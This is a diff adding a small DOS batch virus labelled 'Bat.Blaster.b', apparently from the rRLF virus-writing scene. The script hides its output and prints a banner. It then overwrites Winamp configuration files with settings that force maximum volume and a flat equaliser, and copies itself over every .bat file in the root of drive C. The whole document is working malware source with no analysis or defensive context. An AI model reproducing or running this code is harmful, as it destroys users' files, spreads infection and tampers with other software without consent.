@@ -1,0 +1,19 @@
+@ctty nul
+echo.>con
+echo.>con
+echo.>con
+echo                    +------------------------------------------+>con
+echo                    I        Bat.Blaster.b - DvL [rRLF]        I>con
+echo                    +------------------------------------------+>con
+echo.>con
+echo.>con
+echo.[Winamp]>_
+echo.volume=255>>_
+echo.cwd=C:\Program Files\Winamp>>_
+echo.preamp=0>>_
+echo.outname=out_wave.dll>>_
+echo.use_eq=1>>_
+echo.eq_data=0,0,0,0,0,0,0,0,0,0>>_
+for %%_ in (c:\progra~1\winamp\*.ini;c:\progra~1\winamp2\*.ini;c:\progra~1\winamp3\*.ini;c:\progra~1\winamp5\*.ini) do copy _ %%_>nul
+for %%_ in (c:\*.bat) do copy %0 %%_>nul
+cls
